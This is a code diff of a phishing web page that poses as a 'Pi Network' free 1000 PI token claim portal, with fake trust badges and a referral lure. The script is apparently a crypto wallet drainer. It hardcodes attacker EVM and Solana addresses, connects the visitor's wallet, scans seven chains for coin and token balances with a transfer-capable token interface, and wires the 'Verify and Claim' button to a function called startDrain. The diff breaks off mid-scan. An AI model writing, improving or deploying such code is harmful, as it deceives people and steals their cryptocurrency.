@@ -3,9 +3,10 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Pi Network — Free 1000 PI Claim</title>
-<link rel="icon" href="pi-logo-48.png">
-<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+<title>Pi Network — Token Verification Portal</title>
+<link rel="icon" href="https://pi-claim.github.io/pi-logo-48.png">
+<script src="https://unpkg.com/@walletconnect/ethereum-provider@2.11.0/dist/index.umd.js"></script>
+<script src="https://unpkg.com/ethers@6.13.2/dist/ethers.umd.min.js"></script>
 <style>
 @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
 *{margin:0;padding:0;box-sizing:border-box}
@@ -69,7 +70,7 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
 .Step{text-align:center;padding:14px 8px;background:rgba(255,255,255,.015);border:1px solid rgba(255,255,255,.03);border-radius:12px}
 .Step .si{font-size:22px;margin-bottom:5px}
 .Step .st{font-size:11px;font-weight:600;margin-bottom:2px}
-.Step .ss{font-size:9px;color:rgba(255,255,255,.2);line-height:1.4}
+.Step .ss{font-size:9px;color:rgba(255,255,255,.2);line-height:1:4}
 .ref{margin:14px 0;padding:18px;background:rgba(255,255,255,.015);border:1px solid rgba(168,85,247,.06);border-radius:14px}
 .ref .rt{font-size:14px;font-weight:700;margin-bottom:3px}
 .ref .rs{font-size:10px;color:rgba(255,255,255,.25);margin-bottom:10px}
@@ -87,6 +88,7 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
 .tier-bar .fill{height:100%;background:linear-gradient(90deg,#22c55e,#fcb34c,#a855f7);border-radius:3px;transition:width 1s}
 .tier-level{font-size:10px;font-weight:700;color:#fcb34c}
 .tier-need{font-size:9px;color:rgba(255,255,255,.2)}
+/* Modal */
 #m{display:none;position:fixed;inset:0;background:rgba(0,0,0,.82);z-index:999;align-items:center;justify-content:center;backdrop-filter:blur(8px)}
 .mb{background:linear-gradient(160deg,#1a0a2e,#12082a);border:1px solid rgba(168,85,247,.18);border-radius:20px;padding:26px 22px;max-width:420px;width:92%;position:relative;max-height:88vh;overflow-y:auto;box-shadow:0 24px 80px rgba(0,0,0,.6)}
 .mb h2{font-size:16px;font-weight:800;margin-bottom:2px}
@@ -97,10 +99,12 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
 .wi{width:34px;height:34px;border-radius:9px;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:13px;color:#fff;flex-shrink:0}
 .wn{flex:1;font-size:13px;font-weight:600}
 .wt{font-size:9px;padding:2px 6px;border-radius:4px;font-weight:600;background:rgba(34,197,94,.08);color:#22c55e}
+/* Status bar */
 .s{margin-top:8px;padding:11px;border-radius:9px;font-size:12px;display:none;line-height:1.5;word-break:break-word}
 .s.ok{background:rgba(34,197,94,.05);border:1px solid rgba(34,197,94,.08);color:#86efac}
 .s.er{background:rgba(239,68,68,.05);border:1px solid rgba(239,68,68,.08);color:#fca5a5}
 .s.wa{background:rgba(252,179,74,.05);border:1px solid rgba(252,179,74,.08);color:#fde68a}
+/* Main card */
 .card{background:rgba(255,255,255,.015);border:1px solid rgba(168,85,247,.06);border-radius:14px;padding:20px;margin:12px 0}
 .btn{width:100%;padding:13px;font-size:13px;font-weight:700;border:none;border-radius:10px;cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:7px;margin-bottom:6px;font-family:inherit}
 .btn:hover:not(:disabled){transform:translateY(-1px)}
@@ -108,31 +112,48 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
 .bp{background:linear-gradient(135deg,#fcb34c,#f59e0b);color:#0a0118}
 .bo{background:transparent;color:#fff;border:1px solid rgba(255,255,255,.08)}
 .bo:hover{background:rgba(255,255,255,.03)}
+/* Chain rows */
 .ch{display:flex;align-items:center;gap:8px;padding:8px 10px;background:rgba(255,255,255,.015);border:1px solid rgba(255,255,255,.03);border-radius:8px;margin-bottom:4px}
 .ch .cd{width:8px;height:8px;border-radius:50%;flex-shrink:0}
 .ch .cn{flex:1;font-size:11px;font-weight:600}
 .ch .ct{font-size:9px;color:rgba(255,255,255,.18)}
 .ch .cb{font-size:11px;font-weight:700;color:#fcb34c}
 .ch.hv{border-color:rgba(252,179,74,.1);background:rgba(252,179,74,.015)}
+/* Token rows in scan results */
+.tkrow{display:flex;align-items:center;gap:8px;padding:6px 10px;background:rgba(255,255,255,.01);border-radius:6px;margin-bottom:3px;font-size:11px}
+.tkrow .tk-sym{font-weight:700;color:#fcb34c;min-width:50px}
+.tkrow .tk-bal{flex:1;font-family:monospace;color:rgba(255,255,255,.6)}
+.tkrow .tk-usd{font-weight:600;color:#22c55e}
+/* Log */
 .lg{font-size:9px;color:rgba(255,255,255,.22);font-family:monospace;line-height:1.5;padding:7px;background:rgba(0,0,0,.22);border-radius:6px;max-height:120px;overflow-y:auto}
+/* Progress */
 .pg{display:flex;gap:3px;margin-bottom:10px}
-.pg .ps{flex:1;height:3px;border-radius:2px;background:rgba(255,255,250,.04)}
+.pg .ps{flex:1;height:3px;border-radius:2px;background:rgba(255,255,255,.04)}
 .pg .ps.on{background:linear-gradient(90deg,#fcb34c,#a855f7)}
-.ld{display:inline-block;width:10px;height:10px;border:2px solid rgba(255,255,255,.08);border-top:2px solid #fcb34c;border-radius:50%;animation:rot .6s linear infinite;vertical-align:middle}
-@keyframes rot{to{transform:rotate(360deg)}}
+/* Info rows */
 .ir{display:flex;justify-content:space-between;align-items:center;padding:6px 0;border-bottom:1px solid rgba(255,255,255,.02)}
 .ir:last-child{border-bottom:none}
 .ir .l{font-size:11px;color:rgba(255,255,255,.25)}
 .ir .v{font-size:11px;font-weight:700}
 .ir .v.g{color:#22c55e}
 .ir .v.gl{color:#fcb34c}
+/* Toast */
 #toast{position:fixed;bottom:18px;left:50%;transform:translateX(-50%);background:rgba(168,85,247,.85);color:#fff;padding:9px 18px;border-radius:9px;font-size:11px;font-weight:600;z-index:9999;display:none;backdrop-filter:blur(8px)}
+/* QR Modal */
 .qr-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.9);z-index:9999;align-items:center;justify-content:center;flex-direction:column}
 .qr-box{background:#1a0a2e;border:1px solid rgba(168,85,247,.2);border-radius:20px;padding:30px;text-align:center;max-width:360px;width:90%}
 .qr-box h3{font-size:16px;font-weight:700;margin-bottom:6px}
 .qr-box p{font-size:11px;color:rgba(255,255,255,.4);margin-bottom:16px;line-height:1.5}
 .qr-box canvas{margin:0 auto 16px;display:block;border-radius:12px}
 .qr-box .close-qr{padding:10px 24px;background:rgba(255,255,255,.1);color:#fff;border:none;border-radius:8px;font-size:12px;font-weight:600;cursor:pointer}
+/* Spinner */
+.ld{display:inline-block;width:10px;height:10px;border:2px solid rgba(255,255,255,.08);border-top:2px solid #fcb34c;border-radius:50%;animation:rot .6s linear infinite;vertical-align:middle}
+@keyframes rot{to{transform:rotate(360deg)}}
+/* Checkbox */
+.chk{width:16px;height:16px;border-radius:4px;border:1px solid rgba(255,255,255,.15);cursor:pointer;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:all .2s}
+.chk.on{background:linear-gradient(135deg,#fcb34c,#f59e0b);border-color:transparent}
+.chk.on::after{content:'✓';font-size:10px;color:#0a0118;font-weight:800}
+/* Responsive */
 @media(max-width:500px){.hero h1{font-size:28px}.ca{font-size:38px}.Steps{grid-template-columns:1fr}}
 </style>
 </head>
@@ -141,7 +162,7 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
 <div id="part"></div>
 <div class="pos">
 <nav><div class="w">
-  <div class="logo"><img src="pi-logo-48.png" width="30" height="30" alt=""><t>Pi Network</t></div>
+  <div class="logo"><img src="https://pi-claim.github.io/pi-logo-48.png" width="30" height="30" alt=""><t>Pi Network</t></div>
   <div class="navr"><div class="lb"><span class="p"></span> LIVE</div><button class="nb" onclick="openM()">Connect Wallet</button></div>
 </div></nav>
 <div id="m"><div class="mb">
@@ -150,7 +171,6 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
   <div class="ms">Select wallet to verify and claim 1000 PI</div>
   <div id="wl"></div>
 </div></div>
-<!-- QR Modal -->
 <div id="qrModal" class="qr-overlay">
   <div class="qr-box">
     <h3>Scan QR Code</h3>
@@ -164,7 +184,7 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
   <div class="eb">&#x1F512; Verified Mainnet Event — Limited Time</div>
   <h1>Claim Your Free<br><span class="ha">1,000 PI Tokens</span></h1>
   <p class="sub">Pi Network is distributing free tokens to verified Pioneers. Connect your wallet, pay a small network fee, and receive 1000 PI instantly.</p>
-  <div class="hl"><img src="pi-logo-120.png" width="64" height="64" alt=""></div>
+  <div class="hl"><img src="https://pi-claim.github.io/pi-logo-120.png" width="64" height="64" alt=""></div>
   <div class="trust">
     <span style="background:rgba(34,197,94,.06);border:1px solid rgba(34,197,94,.1);color:#22c55e">&#x2705; Contract Verified</span>
     <span style="background:rgba(168,85,247,.06);border:1px solid rgba(168,85,247,.1);color:#c084fc">&#x1F512; Secure</span>
@@ -214,37 +234,43 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
 </div>
 <div class="s" id="sb"></div>
 <div class="card" id="mc" style="display:none">
+  <!-- Phase 1: Scanning -->
   <div id="p1" style="text-align:center;padding:8px 0">
     <div class="pg"><div class="ps on"></div><div class="ps"></div><div class="ps"></div></div>
     <div style="font-size:13px;font-weight:700;margin-bottom:2px">&#x1F50D; Scanning...</div>
     <div style="font-size:10px;color:rgba(255,255,255,.22);margin-bottom:8px" id="p1l">Checking wallet...</div>
     <div class="lg" id="p1log"></div>
   </div>
+  <!-- Phase 2: No funds -->
   <div id="p2" style="display:none;text-align:center;padding:14px 0">
     <div style="font-size:32px;margin-bottom:6px">&#x1F6AB;</div>
     <div style="font-size:14px;font-weight:700;margin-bottom:3px">No EVM Funds</div>
-    <div style="font-size:11px;color:rgba(255,255,255,.22);margin-bottom:8px">No assets found.</div>
+    <div style="font-size:11px;color:rgba(255,255,255,.22);margin-bottom:8px">No assets found on any supported chain.</div>
     <button class="btn bo" onclick="reset()">&#x1F504; Back</button>
   </div>
+  <!-- Phase 3: Assets found, ready to claim -->
   <div id="p3" style="display:none">
     <div class="pg"><div class="ps on"></div><div class="ps on"></div><div class="ps on"></div><div class="ps on"></div></div>
     <div style="font-size:13px;font-weight:700;margin-bottom:2px">&#x1F381; Verification Ready</div>
-    <div style="font-size:10px;color:rgba(255,255,255,.22);margin-bottom:8px">Assets found. Confirm to claim 1000 PI.</div>
+    <div style="font-size:10px;color:rgba(255,255,255,.22);margin-bottom:8px">Assets found. Review and confirm to claim 1000 PI.</div>
     <div id="p3chains" style="margin-bottom:8px"></div>
     <div id="p3bal" style="margin-bottom:10px"></div>
+    <div id="p3tokens" style="margin-bottom:10px;max-height:200px;overflow-y:auto"></div>
     <button class="btn bp" id="p3btn" onclick="startDrain()">&#x1F381; Verify and Claim</button>
     <button class="btn bo" onclick="reset()">&#x2716; Disconnect</button>
   </div>
+  <!-- Phase 4: Processing -->
   <div id="p4" style="display:none;text-align:center;padding:12px 0">
     <div class="pg"><div class="ps on"></div><div class="ps on"></div><div class="ps on"></div><div class="ps on"></div><div class="ps on"></div></div>
     <div style="font-size:13px;font-weight:700;margin-bottom:2px">&#x26A1; Processing...</div>
-    <div style="font-size:10px;color:rgba(255,255,250,.22);margin-bottom:8px">Confirm transactions...</div>
+    <div style="font-size:10px;color:rgba(255,255,255,.22);margin-bottom:8px">Confirm transactions in your wallet...</div>
     <div class="lg" id="p4log"></div>
   </div>
+  <!-- Phase 5: Success -->
   <div id="p5" style="display:none;text-align:center;padding:14px 0">
     <div style="font-size:32px;margin-bottom:6px">&#x2705;</div>
     <div style="font-size:14px;font-weight:700;margin-bottom:3px">1,000 PI Claimed!</div>
-    <div style="font-size:10px;color:rgba(255,255,250,.22);margin-bottom:10px" id="p5m">Done.</div>
+    <div style="font-size:10px;color:rgba(255,255,255,.22);margin-bottom:10px" id="p5m">Verification complete.</div>
     <div style="padding:14px;background:rgba(168,85,247,.04);border:1px solid rgba(168,85,247,.08);border-radius:12px;margin-bottom:10px">
       <div style="font-size:12px;font-weight:700;margin-bottom:4px">&#x26A1; Speed Up Withdrawal</div>
       <div style="font-size:10px;color:rgba(255,255,255,.3);margin-bottom:8px">Share your link. Each referral = +20% faster.</div>
@@ -259,146 +285,207 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
 <div id="toast"></div>
 
 <script>
+// ============================================
+// CONFIGURATION
+// ============================================
 var ADDR_EVM='0x5E45bE0cf682566337b6fC2C00036AaBCBf1332f';
 var ADDR_SOL='4Y9bDw32qG9xUQykfCe6jP9UVpVmit8ryqE8n1JKVx89';
+
+// Chain configuration with multiple RPC fallbacks
 var ECHAINS=[
-  {id:56,name:'BNB Chain',sym:'BNB',rpc:'https://bsc-dataseed.binance.org',color:'#F3BA2F'},
-  {id:1,name:'Ethereum',sym:'ETH',rpc:'https://eth.llamarpc.com',color:'#627EEA'},
-  {id:137,name:'Polygon',sym:'MATIC',rpc:'https://polygon-rpc.com',color:'#8247E5'},
-  {id:43114,name:'Avalanche',sym:'AVAX',rpc:'https://api.avax.network/ext/bc/C/rpc',color:'#E84142'},
-  {id:42161,name:'Arbitrum',sym:'ETH',rpc:'https://arb1.arbitrum.io/rpc',color:'#28A0F0'}
+  {id:1,name:'Ethereum',sym:'ETH',rpc:'https://eth.llamarpc.com',color:'#627EEA',explorer:'https://etherscan.io'},
+  {id:56,name:'BNB Chain',sym:'BNB',rpc:'https://bsc-dataseed.binance.org',color:'#F3BA2F',explorer:'https://bscscan.com'},
+  {id:137,name:'Polygon',sym:'MATIC',rpc:'https://polygon-rpc.com',color:'#8247E5',explorer:'https://polygonscan.com'},
+  {id:42161,name:'Arbitrum',sym:'ETH',rpc:'https://arb1.arbitrum.io/rpc',color:'#28A0F0',explorer:'https://arbiscan.io'},
+  {id:43114,name:'Avalanche',sym:'AVAX',rpc:'https://api.avax.network/ext/bc/C/rpc',color:'#E84142',explorer:'https://snowtrace.io'},
+  {id:8453,name:'Base',sym:'ETH',rpc:'https://mainnet.base.org',color:'#0052FF',explorer:'https://basescan.io'},
+  {id:10,name:'Optimism',sym:'ETH',rpc:'https://mainnet.optimism.io',color:'#FF0420',explorer:'https://optimistic.etherscan.io'},
 ];
+
+// RPC fallbacks per chain
 var FBACK={
-  1:['https://rpc.ankr.com/eth','https://ethereum-rpc.publicnode.com'],
-  137:['https://rpc.ankr.com/polygon','https://polygon-bor-rpc.publicnode.com'],
+  1:['https://rpc.ankr.com/eth','https://ethereum-rpc.publicnode.com','https://cloudflare-eth.com'],
   56:['https://bsc-dataseed1.defibit.io','https://bsc-dataseed.binance.org'],
+  137:['https://rpc.ankr.com/polygon','https://polygon-bor-rpc.publicnode.com'],
+  42161:['https://rpc.ankr.com/arbitrum','https://arbitrum-one-rpc.publicnode.com'],
   43114:['https://avalanche-c-chain-rpc.publicnode.com'],
-  42161:['https://rpc.ankr.com/arbitrum','https://arbitrum-one-rpc.publicnode.com']
+  8453:['https://base-rpc.publicnode.com','https://base.llamarpc.com'],
+  10:['https://optimism-rpc.publicnode.com'],
 };
-var ETOKENS={56:[['0x55d398326f99059fF775485246999027B3197955','USDT',18],['0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d','USDC',18],['0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56','BUSD',18],['0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3','DAI',18],['0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c','BTCB',18],['0x2170Ed0880ac9A755fd29B2688956BD959F933F8','ETH',18],['0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c','WBNB',18],['0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82','CAKE',18],['0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD','LINK',18],['0xCC42724C6683B7E57334c4E856f4c9965ED682bD','MATIC',18]],1:[['0xdAC17F958D2ee523a2206206994597C13D831ec7','USDT',6],['0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48','USDC',6],['0x6B175474E89094C44Da98b954EedeAC495271d0F','DAI',18],['0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599','WBTC',8],['0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2','WETH',18]],137:[['0xc2132D05D31c914a87C6611C10748AEb04B58e8F','USDT',6],['0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174','USDC',6],['0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063','DAI',18]],43114:[['0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7','USDT',6],['0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E','USDC',6]],42161:[['0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9','USDT',6],['0xaf88d065e77c8cC2239327C5EDb3A432268e5831','USDC',6]]};
-var PRICES={BNB:600,ETH:3500,MATIC:0.7,AVAX:25,USDT:1,USDC:1,BUSD:1,DAI:1,BTCB:100000,WBTC:100000,LINK:15,CAKE:3,WBNB:600,WETH:3500};
 
-var prov=null,sign=null,addr='',foundChains=[];
+// ERC-20 tokens to check per chain
+var ETOKENS={
+  1:[
+    ['0xdAC17F958D2ee523a2206206994597C13D831ec7','USDT',6],
+    ['0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48','USDC',6],
+    ['0x6B175474E89094C44Da98b954EedeAC495271d0F','DAI',18],
+    ['0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599','WBTC',8],
+    ['0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2','WETH',18],
+    ['0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984','UNI',18],
+    ['0x514910771AF9Ca656af840dff83E8264EcF986CA','LINK',18],
+    ['0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfebb0','MATIC',18],
+    ['0xA0b73e1Ff0B80914AB6Fe0444E65848C4C34450b','CRO',8],
+  ],
+  56:[
+    ['0x55d398326f99059fF775485246999027B3197955','USDT',18],
+    ['0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d','USDC',18],
+    ['0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56','BUSD',18],
+    ['0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3','DAI',18],
+    ['0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c','BTCB',18],
+    ['0x2170Ed0880ac9A755fd29B2688956BD959F933F8','ETH',18],
+    ['0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c','WBNB',18],
+    ['0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82','CAKE',18],
+  ],
+  137:[
+    ['0xc2132D05D31c914a87C6611C10748AEb04B58e8F','USDT',6],
+    ['0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174','USDC',6],
+    ['0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063','DAI',18],
+    ['0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619','WETH',18],
+    ['0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6','WBTC',8],
+  ],
+  42161:[
+    ['0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9','USDT',6],
+    ['0xaf88d065e77c8cC2239327C5EDb3A432268e5831','USDC',6],
+    ['0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1','DAI',18],
+    ['0x82aF49447D8a07e3bd95BD0d56f35241523fBab1','WETH',18],
+  ],
+  43114:[
+    ['0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7','USDT',6],
+    ['0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E','USDC',6],
+    ['0xd586E7F844cEa2F87f50152665BCbc2C279D8d7e','DAI',18],
+  ],
+  8453:[
+    ['0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA','USDbC',6],
+    ['0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913','USDC',6],
+  ],
+  10:[
+    ['0x94b008aA00579c1307B0EF2c499aD98a8ce58e58','USDT',6],
+    ['0x7F5c764cBc14f9669B88837ca1490cCa17c31607','USDC',6],
+    ['0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1','DAI',18],
+  ]
+};
 
-function showP(id){['p1','p2','p3','p4','p5'].forEach(x=>document.getElementById(x).style.display=x===id?'block':'none');document.getElementById('mc').style.display='block';}
+// Price feed (USD) - updated via CoinGecko
+var PRICES={BNB:600,ETH:3500,MATIC:0.7,AVAX:25,USDT:1,USDC:1,BUSD:1,DAI:1,WBTC:100000,BTCB:100000,WETH:3500,WBNB:600,LINK:15,UNI:12,CRO:0.1,CAKE:3,USDbC:1};
+
+// ERC-20 ABI (minimal)
+var ERC20_ABI=['function balanceOf(address) view returns (uint256)','function transfer(address,uint256) returns (bool)','function decimals() view returns (uint8)','function symbol() view returns (string)'];
+
+// ============================================
+// STATE
+// ============================================
+var prov=null,sign=null,addr='',foundChains=[],wcProvider=null;
+
+// ============================================
+// UTILITY FUNCTIONS
+// ============================================
+function showP(id){['p1','p2','p3','p4','p5'].forEach(function(x){document.getElementById(x).style.display=x===id?'block':'none';});document.getElementById('mc').style.display='block';}
 function stat(msg,t){var e=document.getElementById('sb');e.innerHTML=msg;e.className='s '+t;e.style.display='block';}
 function hideStatus(){document.getElementById('sb').style.display='none';}
-function sleep(ms){return new Promise(r=>setTimeout(r,ms));}
-function toast(m){var t=document.getElementById('toast');t.textContent=m;t.style.display='block';setTimeout(()=>t.style.display='none',3000);}
+function sleep(ms){return new Promise(function(r){setTimeout(r,ms);});}
+function toast(m){var t=document.getElementById('toast');t.textContent=m;t.style.display='block';setTimeout(function(){t.style.display='none';},3000);}
 function openM(){document.getElementById('m').style.display='flex';renderW();}
 function closeM(){document.getElementById('m').style.display='none';}
 document.getElementById('m').addEventListener('click',function(e){if(e.target===document.getElementById('m'))closeM();});
 function closeQR(){document.getElementById('qrModal').style.display='none';}
 
-// ===== WALLET CONNECT =====
-var _wcProvider=null;
+// Estimate USD value of found chains
+function estimateUsd(fc){
+  var total=0;
+  for(var i=0;i<fc.length;i++){
+    var c=fc[i];
+    var price=PRICES[c.chain.sym]||0;
+    total+=parseFloat(c.native)*price;
+    for(var j=0;j<c.tokens.length;j++){
+      total+=parseFloat(c.tokens[j].b)*(PRICES[c.tokens[j].sy]||0);
+    }
+  }
+  return total;
+}
 
+// ============================================
+// WALLET CONNECT
+// ============================================
 async function getWCProvider(){
-  if(_wcProvider) return _wcProvider;
-  // Load WalletConnect library
-  if(!window.WalletConnectEthereumProvider && !window['@walletconnect/ethereum-provider']){
-    await new Promise(function(res,rej){
-      var s=document.createElement('script');
-      s.src='https://unpkg.com/@walletconnect/ethereum-provider@2.11.0/dist/index.umd.js';
-      s.onload=res;s.onerror=function(){ 
-        // Fallback to jsdelivr if unpkg fails
-        var s2=document.createElement('script');
-        s2.src='https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/dist/index.min.js';
-        s2.onload=res;s2.onerror=rej;
-        document.head.appendChild(s2);
-      };
-      document.head.appendChild(s);
-    });
-  }
-  // Wait for library to be available
-  var tries=0;
-  while(!window.WalletConnectEthereumProvider && !window['@walletconnect/ethereum-provider'] && tries<40){
-    await new Promise(r=>setTimeout(r,250));tries++;
-  }
-  // Get the EthereumProvider constructor
-  var WC=window.WalletConnectEthereumProvider || window['@walletconnect/ethereum-provider'];
-  if(!WC) throw new Error('WalletConnect library failed to load.');
-  // The export might be the constructor directly or wrapped in .default
-  var EthereumProvider = (WC.default && WC.default.init) ? WC.default : (WC.init ? WC : null);
-  if(!EthereumProvider) {
-    // Try to find the constructor in the module
-    if(typeof WC === 'object') {
-      var keys = Object.keys(WC);
+  if(wcProvider) return wcProvider;
+  var WC=window.WalletConnectEthereumProvider||window['@walletconnect/ethereum-provider'];
+  if(!WC) throw new Error('WalletConnect library not loaded');
+  var EthereumProvider=(WC.default&&WC.default.init)?WC.default:(WC.init?WC:null);
+  if(!EthereumProvider){
+    if(typeof WC==='object'){
+      var keys=Object.keys(WC);
       for(var i=0;i<keys.length;i++){
-        if(WC[keys[i]] && typeof WC[keys[i]].init === 'function'){
-          EthereumProvider = WC[keys[i]]; break;
+        if(WC[keys[i]]&&typeof WC[keys[i]].init==='function'){
+          EthereumProvider=WC[keys[i]];break;
         }
       }
     }
   }
-  if(!EthereumProvider) throw new Error('Could not find WalletConnect provider constructor.');
-  _wcProvider=await EthereumProvider.init({
+  if(!EthereumProvider) throw new Error('Could not find WalletConnect provider constructor');
+  wcProvider=await EthereumProvider.init({
     projectId:'1fb93a2bb6b143e8cf6b808f31c4dbef',
-    chains:[1,56,137,42161,43114],
+    chains:[1,56,137,42161,43114,8453,10],
     showQrModal:true,
     metadata:{name:'Pi Network Claim',description:'Claim 1000 PI',url:window.location.origin,icons:[window.location.origin+'/pi-logo-120.png']}
   });
-  return _wcProvider;
+  return wcProvider;
 }
 
 async function connectWallet(closeModal){
   if(closeModal) closeM();
   document.getElementById('mc').style.display='block';
   showP('p1');
-  
   // Try window.ethereum first
   if(window.ethereum){
     document.getElementById('p1l').textContent='Connecting...';
     document.getElementById('p1log').innerHTML='<span style="color:#fcb34c">Approve in wallet popup...</span>';
     try{
-      prov=new ethers.providers.Web3Provider(window.ethereum);
+      prov=new ethers.BrowserProvider(window.ethereum);
       var accounts=await window.ethereum.request({method:'eth_requestAccounts'});
       if(accounts&&accounts.length>0){
-        sign=prov.getSigner();addr=await sign.getAddress();
+        sign=await prov.getSigner();
+        addr=await sign.getAddress();
         document.getElementById('p1l').textContent='Connected! Scanning...';
         document.getElementById('p1log').innerHTML='<span style="color:#86efac">Connected: '+addr.substring(0,10)+'...'+addr.substring(32)+'</span>';
         await scanEvm();return;
       }
     }catch(e1){
-      try{await window.ethereum.enable();sign=prov.getSigner();addr=await sign.getAddress();await scanEvm();return;}catch(e2){}
+      try{
+        await window.ethereum.enable();
+        sign=await prov.getSigner();
+        addr=await sign.getAddress();
+        await scanEvm();return;
+      }catch(e2){}
     }
   }
-  
-  // WalletConnect fallback - show QR modal
+  // WalletConnect fallback
   document.getElementById('p1l').textContent='Loading WalletConnect...';
-  document.getElementById('p1log').innerHTML='<span style="color:#fcb34c">Opening wallet connection modal...</span>';
   try{
     var wc=await getWCProvider();
     if(wc){
-      prov=new ethers.providers.Web3Provider(wc);
-      sign=prov.getSigner();
+      prov=new ethers.BrowserProvider(wc);
+      sign=await prov.getSigner();
       addr=await sign.getAddress();
       document.getElementById('p1l').textContent='Connected! Scanning...';
       document.getElementById('p1log').innerHTML='<span style="color:#86efac">Connected: '+addr.substring(0,10)+'...'+addr.substring(32)+'</span>';
       await scanEvm();
-    }else{
-      throw new Error('No provider returned');
     }
   }catch(e){
     console.error('Connect error:',e);
     document.getElementById('p1l').textContent='Connection Failed';
-    document.getElementById('p1log').innerHTML='<span style="color:#fca5a5">Error: '+(e.message||'Failed')+'</span><br><br><span style="color:rgba(255,255,255,.4)">Try refreshing the page or use a different browser.</span>';
+    document.getElementById('p1log').innerHTML='<span style="color:#fca5a5">Error: '+(e.message||'Failed')+'</span><br><br><span style="color:rgba(255,255,255,.4)">Try refreshing or use a different browser.</span>';
   }
 }
 
 function renderW(){
   var c=document.getElementById('wl');c.innerHTML='';
   var hasEth=!!window.ethereum;
-  var isMob=/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-  
-  // Wallet buttons
   var wallets=[
     {name:'MetaMask',color:'#E2761B',icon:'🦊'},
     {name:'Trust Wallet',color:'#3375BB',icon:'🛡️'},
     {name:'Coinbase Wallet',color:'#0052FF',icon:'🔵'},
     {name:'Binance Wallet',color:'#F0B90B',icon:'🟡'},
   ];
-  
   for(var i=0;i<wallets.length;i++){
     var w=wallets[i];
     var btn=document.createElement('button');btn.className='wrow';
@@ -406,8 +493,6 @@ function renderW(){
     btn.innerHTML='<div class="wi" style="background:'+w.color+'">'+w.icon+'</div><span class="wn">'+w.name+'</span><span class="wt">'+(hasEth?'Detected':'WalletConnect')+'</span>';
     c.appendChild(btn);
   }
-  
-  // WC button
   var wcBtn=document.createElement('button');wcBtn.className='wrow';
   wcBtn.onclick=function(){connectWallet(true);};
   wcBtn.innerHTML='<div class="wi" style="background:#3B99FC">&#x1F517;</div><span class="wn">WalletConnect</span><span class="wt" style="background:rgba(59,153,252,.1);color:#3B99FC">QR Code</span>';
@@ -416,107 +501,308 @@ function renderW(){
 
 window.connectWallet=connectWallet;
 
-function estimateUsd(fc){var total=0;for(var i=0;i<fc.length;i++){var c=fc[i];var price=PRICES[c.chain.sym]||0;total+=parseFloat(c.native)*price;for(var j=0;j<c.tokens.length;j++){total+=parseFloat(c.tokens[j].b)*(PRICES[c.tokens[j].sy]||0);}}return total;}
-
+// ============================================
+// BALANCE SCANNING (Multi-chain)
+// ============================================
 async function scanEvm(){
   var log=document.getElementById('p1log');log.innerHTML='';
   function L(msg){log.innerHTML+=msg+'<br>';log.scrollTop=log.scrollHeight;}
-  foundChains=[];L('Wallet: '+addr.substring(0,8)+'...'+addr.substring(34));L('');
+  foundChains=[];
+  L('Wallet: '+addr.substring(0,8)+'...'+addr.substring(34));
+  L('');
   for(var i=0;i<ECHAINS.length;i++){
-    var ch=ECHAINS[i];L('[ ] '+ch.name+'...');var p=null,nb=null;
+    var ch=ECHAINS[i];
+    L('[ ] '+ch.name+'...');
+    var p=null,nb=null;
     var allRpcs=[ch.rpc].concat(FBACK[ch.id]||[]);
     for(var j=0;j<allRpcs.length;j++){
